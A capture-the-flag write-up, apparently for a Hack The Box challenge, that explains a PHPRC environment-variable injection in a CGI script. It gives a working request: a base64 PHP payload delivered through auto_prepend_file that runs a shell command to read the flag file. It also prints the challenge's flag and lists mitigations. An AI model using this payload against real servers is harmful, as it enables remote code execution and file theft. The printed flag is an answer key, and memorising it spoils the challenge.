Write-Up for the Exploit Script:

# Lyra's Tavern Exploit Explanation

## Vulnerability Overview

The Lyra's Tavern application contains a critical vulnerability in the `app.cgi` script that allows an attacker to:

1. Override PHP configuration settings by controlling the PHPRC environment variable
2. Execute arbitrary PHP code via the `auto_prepend_file` directive
3. Read sensitive files from the server, including the flag file

## How the Vulnerability Works

1. The `app.cgi` script accepts a `PHPRC` parameter from user input:
   ```php
   $phprc = isset($_REQUEST['PHPRC']) ? $_REQUEST['PHPRC'] : null;
   ```

2. It then sets this as an environment variable that controls PHP's configuration:
   ```php
   putenv("PHPRC=" . $phprc);
   ```

3. By setting `PHPRC=/dev/fd/0`, we can make PHP read its configuration from standard input
   - `/dev/fd/0` is a special file that corresponds to stdin

4. The script also accepts a `data` parameter that gets passed to PHP via stdin:
   ```php
   $cmd = "printf \"%b\" " . escapeshellarg($data);
   $cmd = $cmd . " | php /www/application/config.php";
   ```

5. We can inject PHP configuration directives through this `data` parameter:
   - `allow_url_include=1` - Enables inclusion of remote files via URL
   - `auto_prepend_file=data://...` - Makes PHP execute our code before any script

## The Exploit Step by Step

1. **Create a PHP payload** that will read the flag file:
   ```php
   <?php system("cat /flag.txt"); ?>
   ```

2. **Encode the payload as a base64 data URL**:
   ```
   data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWcudHh0Iik7ID8+
   ```

3. **Format the request** with:
   - URL: `http://<target>/cgi-bin/app.cgi?PHPRC=/dev/fd/0`
   - POST data: `data=allow_url_include%3D1%0Aauto_prepend_file%3D%22data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCJjYXQgL2ZsYWcudHh0Iik7ID8%2B%22`

4. When this request is processed:
   - PHP reads its configuration from our provided data
   - The `auto_prepend_file` directive makes it execute our payload
   - Our payload runs `cat /flag.txt` and outputs the flag
  
```
HTB{N0W_Y0U_S33_M3_N0W_Y0U_D0NT!@_672eda5ab455a16bb2248bba717144f3}
```

## Why This Works

The vulnerability exists because:

1. The application allows user control of the `PHPRC` environment variable
2. It then executes PHP with this configuration
3. The `/dev/fd/0` trick allows us to supply both the configuration and the execution data in a single request
4. PHP's `auto_prepend_file` directive lets us execute code before any script runs

## Mitigation

To prevent this vulnerability:

1. Never allow users to control the `PHPRC` environment variable
2. Use proper input validation for all user-supplied data
3. Disable dangerous PHP directives like `allow_url_include`
4. Run PHP with restricted permissions
5. Implement proper filesystem access controls
